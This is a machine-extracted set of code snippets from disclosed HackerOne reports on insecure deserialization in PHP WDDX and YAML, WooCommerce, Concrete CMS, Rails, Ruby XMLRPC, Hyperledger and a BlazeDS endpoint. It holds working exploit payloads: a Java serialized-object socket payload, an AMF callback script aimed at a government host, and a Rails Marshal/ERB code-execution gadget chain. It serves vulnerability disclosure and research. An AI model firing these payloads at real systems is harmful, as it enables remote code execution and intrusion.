# Insecure deserialization — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #170144 wddx_deserialize use-after-free — ibb — $500 — Memory Corruption - Generic
Source: `hackerone/reports/2019/170144.md` (https://hackerone.com/reports/170144)

```
http://git.php.net/?p=php-src.git;a=commit;h=780daee62b55995a10f8e849159eff0a25bacb9d
```

## #161217 wddx_deserialize null dereference in php_wddx_pop_element — ibb — $500 — Memory Corruption - Generic
Source: `hackerone/reports/2019/161217.md` (https://hackerone.com/reports/161217)

```
Source code:
https://github.com/php/php-src/blob/PHP-5.6.24/ext/wddx/wddx.c#L985

static void php_wddx_pop_element(void *user_data, const XML_Char *name)
{
...
  if (Z_TYPE_P(ent2->data) == IS_ARRAY || Z_TYPE_P(ent2->data) == IS_OBJECT) {
    target_hash = HASH_OF(ent2->data);
...
```

```
http://git.php.net/?p=php-src.git;a=commit;h=1f6078e4a5c67733bfdbd20bb2706501ac56a344
```

## #161198 wddx_deserialize null dereference with invalid xml — ibb — $500 — Memory Corruption - Generic
Source: `hackerone/reports/2019/161198.md` (https://hackerone.com/reports/161198)

```
https://github.com/php/php-src/blob/PHP-5.6/ext/wddx/wddx.c#L1170

 wddx_stack_top(&stack, (void**)&ent);
 *return_value = *(ent->data);
```

```
https://github.com/php/php-src/blob/PHP-7.0.9/ext/wddx/wddx.c#L1075

 wddx_stack_top(&stack, (void**)&ent);
 ZVAL_COPY(return_value, &ent->data);
```

```
http://git.php.net/?p=php-src.git;a=commit;h=1f6078e4a5c67733bfdbd20bb2706501ac56a344
```

## #248659 PHP WDDX Deserialization Heap OOB Read in timelib_meridian() — ibb — $500 — Buffer Over-read
Source: `hackerone/reports/2019/248659.md` (https://hackerone.com/reports/248659)

```
CC="`which gcc`" CFLAGS="-O0 -g -fsanitize=address" ./configure --prefix="`pwd`/../php7_wddx" --disable-shared --enable-wddx
```

```
$ cat repro.wddx 
<?xml version='1.0'?>
<!DOCTYPE wddxPacket SYSTEM 'wddx_0100.dtd'>
<wddxPacket version='1.0'>
<header/>
	<data>
        	<struct>
                    <var name='aDateTime'>
                         <dateTime>I06.00am 0</dateTime>
                     </var>
                </struct>
	</data>
</wddxPacket>
```

```
$ cat wddx.php 
<?php
$argc = $_SERVER['argc'];
$argv = $_SERVER['argv'];

$dir_str = dirname(__FILE__);
$file_str = ($dir_str)."/".$argv[1];

if (!extension_loaded('wddx')) print "wddx not loaded.\n";

$wddx_str = file_get_contents($file_str);
print strlen($wddx_str) . " bytes read.\n";
var_dump(wddx_deserialize($wddx_str));
?>
```

## #161200 wddx_deserialize allows illegal memory access — ibb — $500 — Memory Corruption - Generic
Source: `hackerone/reports/2019/161200.md` (https://hackerone.com/reports/161200)

```
<?php

// timestamp(2004-09-10T05:52:49+00) = 0x41414131

$xml = <<<XML
<?xml version='1.0'?>
<!DOCTYPE wddxPacket SYSTEM 'wddx_0100.dtd'>
<wddxPacket version='1.0'>
<header/>
        <data>
                <struct>
                     <var name='aDateTime3'>
                         <dateTime>2\r2004-09-10T05:52:49+00</dateTime>
                     </var>
                 </struct>
        </data>
</wddxPacket>
XML;

$array = wddx_deserialize($xml);
var_dump($array);

$ gdb -q --args /ramdisk/php-fuzz/phuzzer/php-70//sapi/cli/php -n wdx17.php
No symbol table is loaded.  Use the "file" command.
Breakpoint 1 (__asan_report_error) pending.
Reading symbols from /ramdisk/php-fuzz/phuzzer/php-70//sapi/cli/php...done.
gdb-peda$ r
Starting program: /ramdisk/php-fuzz/phuzzer/php-70/sapi/cli/php -n wdx17.php
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
array(1) {
  ["aDateTime3"]=>

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x7fffef65ea20 --> 0x41414131 ('1AAA')
RCX: 0x1501b90 (<php_var_dump+1312>:    mov    r13,rbx)
RDX: 0x8282828
RSI: 0x41414131 ('1AAA')
RDI: 0x41414141 ('AAAA')
RBP: 0x7fffffffa280 --> 0x7fffffffa400 --> 0x7fffffffa4e0 --> 0x7fffffffa530 --> 0x7fffffffa550 --> 0x7fffffffa5c0 (--> ...)
RSP: 0x7fffffffa110 --> 0x16ae960 (<php_printf>:        lea    rsp,[rsp-0x98])
RIP: 0x1501bf8 (<php_va
```

```
http://git.php.net/?p=php-src.git;a=commit;h=426aeb2808955ee3d3f52e0cfb102834cdb836a5
```

```
        <data>
                <struct>
                     <var name='aDateTime3'>
                         <dateTime>2\r2004-09-10T05:52:49+00</dateTime>
                     </var>
                 </struct>
        </data>
```

## #73257 PHP yaml_parse/yaml_parse_file/yaml_parse_url Unsafe Deserialization — ibb — $500 — None
Source: `hackerone/reports/2015/73257.md` (https://hackerone.com/reports/73257)

```
<?php 
class A {
    function __destruct() {
       echo 'destructor invoked';
    }
}

yaml_parse('x: !php/object O:1:"A":0:{}');
?>
```

```
<?php 
class A {
    function __destruct() {
       echo 'destructor invoked';
    }
}

yaml_parse_url('http://autosectools.com/yaml.txt');
?>
```

```
    function __destruct() {
       echo 'destructor invoked';
    }
```

## #161216 wddx_deserialize null dereference — ibb — $500 — Memory Corruption - Generic
Source: `hackerone/reports/2019/161216.md` (https://hackerone.com/reports/161216)

```
https://github.com/php/php-src/blob/master/ext/wddx/wddx.c#L896

                if (!strcmp((char *)name, EL_BINARY)) {
                        zend_string *new_str = php_base64_decode(
                                (unsigned char *)Z_STRVAL(ent1->data), Z_STRLEN(ent1->data));
                        zval_ptr_dtor(&ent1->data);
                        ZVAL_STR(&ent1->data, new_str);
                }
```

```
http://git.php.net/?p=php-src.git;a=commit;h=698a691724c0a949295991e5df091ce16f899e02
```

```
                if (!strcmp((char *)name, EL_BINARY)) {
                        zend_string *new_str = php_base64_decode(
                                (unsigned char *)Z_STRVAL(ent1->data), Z_STRLEN(ent1->data));
                        zval_ptr_dtor(&ent1->data);
                        ZVAL_STR(&ent1->data, new_str);
                }
```

## #396954 Attacker can add arbitrary data to the blockchain without paying gas — rootstocklabs — - — Deserialization of Untrusted Data
Source: `hackerone/reports/2019/396954.md` (https://hackerone.com/reports/396954)

```
remote:~/rskj$ java -Dblockchain.config.name=regtest -cp rskj-core/build/libs/rskj-core-0.5.0-SNAPSHOT-all.jar co.rsk.Start
```

```
local:~/rskj$ # Start the attacker's node:
local:~/rskj$ java -Dblockchain.config.name=regtest -cp rskj-core/build/libs/rskj-core-0.5.0-SNAPSHOT-all.jar co.rsk.Start
local:~/rskj$
local:~/rskj$ # Create a new account:
local:~/rskj$ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"personal_newAccount", "params": ["beef"], "id":666}' http://127.0.0.1:4444/
{"jsonrpc":"2.0","id":666,"result":"0x0e016bdab929a365c7419ba51d0902cbde6035c2"}
local:~/rskj$
local:~/rskj$ # Send a transaction:
local:~/rskj$ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"eth_sendTransaction", "params": [{"from": "0xCd2a3d9f938e13Cd947eC05ABC7fe734df8DD826", "to":"0x0e016bdab929a365c7419ba51d0902cbde6035c2", "gas":"0x76c0", "gasPrice": "0x9184e72a000", "value":"0x9184e72a"}], "id":666}' http://127.0.0.1:4444/
{"jsonrpc":"2.0","id":666,"result":"0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301"}
local:~/rskj$
local:~/rskj$ # Wait for the transaction to propagate to the remote server and be mined
local:~/rskj$ # Then check the receipt to see that it made it into the block:
local:~/rskj$ $ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"eth_getTransactionReceipt", "params": ["0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301"], "id":666}' http://127.0.0.1:4444/
{"jsonrpc":"2.0","id":666,"result":{"transactionHash":"0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c
```

```
diff --git a/rskj-core/src/main/java/org/ethereum/core/Transaction.java b/rskj-core/src/main/java/org/ethereum/core/Transaction.java
index bbd21ee..801e18d 100644
--- a/rskj-core/src/main/java/org/ethereum/core/Transaction.java
+++ b/rskj-core/src/main/java/org/ethereum/core/Transaction.java
@@ -164,7 +164,7 @@ public class Transaction {
     }
 
     public Transaction toImmutableTransaction() {
-        return new ImmutableTransaction(this.getEncoded());
+        return new ImmutableTransaction(this.getBeefyEncoded());
     }
 
     private byte extractChainIdFromV(byte v) {
@@ -516,7 +516,17 @@ public class Transaction {
         return rlpRaw;
     }
 
+    // Clear the rlpEncoded if present, and re-encode with extra 0xbeef data
+    public byte[] getBeefyEncoded() {
+        rlpEncoded = null;
+        return getEncodedInternal("beefbeefbeefbeefbeefbeefbeefbeefbeefbeefbeef");
+    }
+
     public byte[] getEncoded() {
+        return getEncodedInternal(null);
+    }
+    private byte[] getEncodedInternal(String beef) {
         if (rlpEncoded != null) {
             return rlpEncoded;
         }
@@ -556,8 +566,15 @@ public class Transaction {
             s = RLP.encodeElement(EMPTY_BYTE_ARRAY);
         }
 
-        this.rlpEncoded = RLP.encodeList(toEncodeNonce, toEncodeGasPrice, toEncodeGasLimit,
-                toEncodeReceiveAddress, toEncodeValue, toEncodeData, v, r, s);
+        // if 0xbeef bytes are present, tack them on at the end of the tx
+        if (beef !
```

## #403083 Authenticated Code Execution through Phar deserialization in CSV Importer as Shop manager in WooCommerce — automattic — - — Deserialization of Untrusted Data
Source: `hackerone/reports/2019/403083.md` (https://hackerone.com/reports/403083)

```
	public function __construct( $file, $params = array() ) {
		$default_args = array(
			'start_pos'        => 0, // File pointer start.
			'end_pos'          => -1, // File pointer end.
			'lines'            => -1, // Max lines to read.
			'mapping'          => array(), // Column mapping. csv_heading => schema_heading.
			'parse'            => false, // Whether to sanitize and format data.
			'update_existing'  => false, // Whether to update existing items.
			'delimiter'        => ',', // CSV delimiter.
			'prevent_timeouts' => true, // Check memory and time usage and abort if reaching limit.
			'enclosure'        => '"', // The character used to wrap text in the CSV.
			'escape'           => "\0", // PHP uses '\' as the default escape character. This is not RFC-4180 compliant. This disables the escape character.
		);

		$this->params = wp_parse_args( $params, $default_args );
		$this->file   = $file;

		if ( isset( $this->params['mapping']['from'], $this->params['mapping']['to'] ) ) {
			$this->params['mapping'] = array_combine( $this->params['mapping']['from'], $this->params['mapping']['to'] );
		}

		$this->read_file();
	}

	/**
	 * Read file.
	 */
	protected function read_file() {
		$handle = fopen( $this->file, 'r' ); // @codingStandardsIgnoreLine.

		if ( false !== $handle ) {
			$this->raw_keys = version_compare( PHP_VERSION, '5.3', '>=' ) ? fgetcsv( $handle, 0, $this->params['delimiter'], $this->params['enclosure'], $this->params['escape'] ) : fgetcsv( $handle, 0, $th
```

## #2255968 CVE-2023-46132 — hyperledger — - — Deserialization of Untrusted Data
Source: `hackerone/reports/2024/2255968.md` (https://hackerone.com/reports/2255968)

```
    [e][OrdererOrg.orderer] 2023-10-14 23:07:34.076 CEST 0079 INFO [orderer.consensus.etcdraft] propose -> Created block [10] with 2 transactions, there are 0 blocks in flight channel=testchannel node=1
```

```
    [e][Org2.peer0] 2023-10-14 23:07:34.079 CEST 0099 INFO [kvledger] commit -> [testchannel] Committed block [10] with 1 transaction(s) in 0ms (state_validation=0ms block_and_pvtdata_commit=0ms state_commit=0ms) commitHash=[c5ecca818da9319af2f276dd01cd1337938f20c3535dd23f95a33933a114fe84]
```

## #728614 [HTAF4-213] [Pre-submission] Unsafe AMF deserialization (CVE-2017-5641) in Apache Flex BlazeDS at the https://www.███████/daip/messagebroker/amf — deptofdefense — - — Deserialization of Untrusted Data
Source: `hackerone/reports/2024/728614.md` (https://hackerone.com/reports/728614)

```
POST /daip/messagebroker/amf HTTP/1.1
Host: www.███████
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.22.0
Content-Type: application/x-amf
Content-Length: 51

<your collaborator host>
```

```
import struct
import sys
import requests
 
if len(sys.argv) != 3:
    print "Usage: host port"
    quit()
 

callback_IP = sys.argv[1]
callback_port = sys.argv[2]
 
amf_payload = '\x00\x03\x00\x00\x00\x01\x00\x00\x00\x00\xff\xff\xff\xff\x11\x0a' + \
              '\x07\x33' + 'sun.rmi.server.UnicastRef' + struct.pack('>H', len(callback_IP)) + callback_IP + \
              struct.pack('>I', int(callback_port)) + \
              '\xf9\x6a\x76\x7b\x7c\xde\x68\x4f\x76\xd8\xaa\x3d\x00\x00\x01\x5b\xb0\x4c\x1d\x81\x80\x01\x00';
 
url = "https://www.███████/daip/messagebroker/amf"
headers = {'Content-Type': 'application/x-amf'}
response = requests.post(url, headers=headers, data=amf_payload, verify=False)
```

```
              '\x07\x33' + 'sun.rmi.server.UnicastRef' + struct.pack('>H', len(callback_IP)) + callback_IP + \
              struct.pack('>I', int(callback_port)) + \
              '\xf9\x6a\x76\x7b\x7c\xde\x68\x4f\x76\xd8\xaa\x3d\x00\x00\x01\x5b\xb0\x4c\x1d\x81\x80\x01\x00';
```

## #921288 Arbitrary File delete via PHAR deserialization — concretecms — - — Deserialization of Untrusted Data
Source: `hackerone/reports/2021/921288.md` (https://hackerone.com/reports/921288)

```
- File: concrete/controllers/single_page/dashboard/system/files/storage.php
- Line: 131 ~ 148
    
    public function add()
    {
        $type = $this->validateStorageRequest(); // ................................................... (a)
        if (!$this->token->validate('add')) {
            $this->error->add($this->token->getErrorMessage());
        }
        if (!$this->error->has()) {
            $configuration = $type->getConfigurationObject();
            $configuration->loadFromRequest($this->request);
            $factory = $this->app->make(StorageLocationFactory::class);
            /* @var StorageLocationFactory $factory */
            $location = $factory->create($configuration, $this->request->request->get('fslName'));
            $location->setIsDefault($this->request->request->get('fslIsDefault'));
            $location = $factory->persist($location);
            $this->redirect('/dashboard/system/files/storage', 'storage_location_added');
        }
        $this->set('type', $type);
    }
```

```
- File: concrete/controllers/single_page/dashboard/system/files/storage.php
- Line: 64 ~ 81
    
    protected function validateStorageRequest()
    {
        $val = $this->app->make('helper/validation/strings');
        $type = Type::getByID($this->request->get('fslTypeID'));
        if ($type === null) {
            $this->error->add(t('Invalid type object.'));
        } else {
            $e = $type->getConfigurationObject()->validateRequest($this->request); // ................... (b)
            if (is_object($e)) {
                $this->error->add($e);
            }
        }
        if (!$val->notempty($this->request->request->get('fslName'))) {
            $this->error->add(t('Your file storage location must have a name.'));
        }
 
        return $type;
    }
```

```
- File: concrete/src/File/StorageLocation/Configuration/LocalConfiguration.php
- Line: 75 ~ 102
    
    public function validateRequest(\Concrete\Core\Http\Request $req)
    {
        $app = Application::getFacadeApplication();
        $e = $app->make('error');
        $data = $req->get('fslType');
        $fslID = $req->get('fslID');
        $locationHasFiles = false;
        $locationRootPath = null;
        if (!empty($fslID)) {
            $location = $app->make(StorageLocationFactory::class)->fetchByID($fslID);
            if (is_object($location)) {
                $locationHasFiles = $location->hasFiles();
                $locationRootPath = $location->getConfigurationObject()->getRootPath();
            }
        }
        $this->path = $data['path'];
        if (!$this->path) {
            $e->add(t("You must include a root path for this storage location."));
        } elseif (!is_dir($this->path)) { // ......................................................... (c)
            $e->add(t("The specified root path does not exist."));
        } elseif ($this->path == '/') {
            $e->add(t('Invalid path to file storage location. You may not choose the root directory.'));
        } elseif ($locationHasFiles && $locationRootPath !== $this->path) {
            $e->add(t('You can not change the root path of this storage location because it contains files.'));
        }

        return $e;
    }
```

## #1702859 Unexpected deserialization in Kredis — rails — - — Deserialization of Untrusted Data
Source: `hackerone/reports/2023/1702859.md` (https://hackerone.com/reports/1702859)

```
module Kredis
  module Type
    class Json < ActiveModel::Type::Value
      def type
        :json
      end

      def cast_value(value)
        JSON.load(value)
      end
```

```
❯ rails new rails_server -G -M -O -C -A -J -T
# Rails 7.0.4 install

❯ cd rails_server

# Edit Gemfile to uncomment `gem "kredis"` 
❯ bundle install
# kredis 1.3.0 install

❯ rails kredis:install
```

```
❯ bundle exec rails c
Loading development environment (Rails 7.0.4)
irb(main):001:0> abc = 'abc'.to_json_raw_object
=> {"json_class"=>"String", "raw"=>[97, 98, 99]}

irb(main):002:0> json = Kredis.json "json_load"
=>
#<Kredis::Types::Scalar:0x00000001099ea250
...

irb(main):003:0> json.value = abc
=> {"json_class"=>"String", "raw"=>[97, 98, 99]}

irb(main):004:0> json.value
=> "abc"
```

## #461308 Remote attacker can impersonate Social users via ActivityPub API — nextcloud — - — Deserialization of Untrusted Data
Source: `hackerone/reports/2019/461308.md` (https://hackerone.com/reports/461308)

```
    // Use same key type and generation code as inside Nextcloud social
    $res = openssl_pkey_new(
            [
                    "digest_alg"       => "rsa",
                    "private_key_bits" => 2048,
                    "private_key_type" => OPENSSL_KEYTYPE_RSA,
            ]
    );
```

```
    openssl_pkey_export($res, $privateKey);
    $publicKey = openssl_pkey_get_details($res)['key'];
```

```
    // Generate a valid request
    $data = "(request-target): post /nextcloud/index.php/apps/social/inbox";
```

## #1739099 CVE-2017-5929: Hyperledger - Arbitrary Deserialization of Untrusted Data  — hyperledger — - — None
Source: `hackerone/reports/2022/1739099.md` (https://hackerone.com/reports/1739099)

```
import socket
import sys

host = sys.argv[1]
port = sys.argv[2]

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "Connecting to: " + host + ":" + port
sock.connect((host, int(port)))
print "Connected."

payload = '\xac\xed\x00\x05\x73\x72\x00\x2e\x6a\x61\x76\x61\x78\x2e\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2e\x42\x61\x64\x41\x74\x74\x72\x69\x62\x75\x74\x65\x56\x61\x6c\x75\x65\x45\x78\x70\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\xd4\xe7\xda\xab\x63\x2d\x46\x40\x02\x00\x01\x4c\x00\x03\x76\x61\x6c\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\xd0\xfd\x1f\x3e\x1a\x3b\x1c\xc4\x02\x00\x00\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\xd5\xc6\x35\x27\x39\x77\xb8\xcb\x03\x00\x04\x4c\x00\x05\x63\x61\x75\x73\x65\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\x3b\x4c\x00\x0d\x64\x65\x74\x61\x69\x6c\x4d\x65\x73\x73\x61\x67\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x0a\x73\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x74\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x4c\x00\x14\x73\x75\x70\x70\x72\x65\x73\x73\x65\x64\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x73\x74\x00\x10\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4c\x69\x73\x74\x3b\x7
```

## #1063039 Phar Deserialization Vulnerability via Logging Settings — concretecms — - — Deserialization of Untrusted Data
Source: `hackerone/reports/2021/1063039.md` (https://hackerone.com/reports/1063039)

```
    public function update_logging()
    {
        $config = $this->app->make('config');
        $request = $this->request;

        if (!$this->token->validate('update_logging')) {
            return $this->showError($this->token->getErrorMessage());
        }

        // Load in variables from the request
        $mode = (string) $request->request->get('logging_mode') === 'advanced' ? 'advanced' : 'simple';
        $handler = $mode === 'simple' ? (string) $request->request->get('handler', 'database') : null;
        $logFile = $handler === 'file' ? (string) $request->request->get('logFile') : null;
        $enableDashboardReport = $request->request->get('enable_dashboard_report') ? true : false;
        $loggingLevel = strtoupper((string) $request->request->get('logging_level'));
        $intLogErrorsPost = $request->request->get('ENABLE_LOG_ERRORS') === 1 ? 1 : 0;
        $intLogEmailsPost = $request->request->get('ENABLE_LOG_EMAILS') === 1 ? 1 : 0;
        $intLogApiPost = $request->request->get('ENABLE_LOG_API') === 1 ? 1 : 0;


        // Handle 'file' based logging
        if ($handler === 'file') {
            $directory = dirname($logFile);

            // Validate the file name
            if (pathinfo($logFile, PATHINFO_EXTENSION) !== 'log') {
                return $this->showError(t('The filename provided must be a valid filename and end with .log'));
            }

            // Validate the file path, create the log file if needed
            if (!file_exists(
```

```
    public function update_logging()
    {
        $config = $this->app->make('config');
        $request = $this->request;
```

```
        if (!$this->token->validate('update_logging')) {
            return $this->showError($this->token->getErrorMessage());
        }
```

## #1189419 XMLRPC does not limit deserializable classes. — ruby — - — Deserialization of Untrusted Data
Source: `hackerone/reports/2023/1189419.md` (https://hackerone.com/reports/1189419)

```
  if Config::ENABLE_MARSHALLING and param.class.included_modules.include? XMLRPC::Marshallable
    # convert Ruby object into Hash
    ret = {"___class___" => param.class.name}
    param.instance_variables.each {|v|
```

```
# Converts the given +hash+ to a marshalled object.
#
# Returns the given +hash+ if an exception occurs.
def self.struct(hash)
  # convert to marshalled object
  klass = hash["___class___"]
  if klass.nil? or Config::ENABLE_MARSHALLING == false
    hash
  else
    begin
      mod = Module
      klass.split("::").each {|const| mod = mod.const_get(const.strip)}

      obj = mod.allocate

      hash.delete "___class___"
      hash.each {|key, value|
        obj.instance_variable_set("@#{ key }", value) if key =~ /^([a-zA-Z_]\w*)$/
      }
      obj
    rescue
      hash
    end
  end
end
```

```
    # enable marshalling Ruby objects which include XMLRPC::Marshallable
    ENABLE_MARSHALLING   = true
```

## #413388 Untrusted strings that are cache fetched with raw option are automatically marshal loaded — rails — - — Deserialization of Untrusted Data
Source: `hackerone/reports/2020/413388.md` (https://hackerone.com/reports/413388)

```
body = Rails.cache.fetch(key, raw: true, expires_in: ttl) do
  res = Net::HTTP.get_response(remote_uri)
  res.value # raise on HTTP error
  res.body
end
```

```
require 'rails/all'

untrusted_string = Marshal.dump(:sym)

cache = ActiveSupport::Cache::MemCacheStore.new('localhost')
cache.delete("demo")
data = cache.fetch("demo", raw: true) { untrusted_string }
p data # "\x04\b:\bsym"
data = cache.fetch("demo", raw: true)
p data # :sym
```

```
require 'erb'
require 'rails/all'

remote_code = <<-RUBY
puts 'HACKED'
RUBY

erb = ERB.allocate
erb.instance_variable_set(:@src, remote_code)
erb.instance_variable_set(:@lineno, 0)
deprecation = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result)
exploit_data = Marshal.dump(deprecation)

obj = Marshal.load(exploit_data)
obj.is_a?(ActiveSupport::Cache::Entry)
```

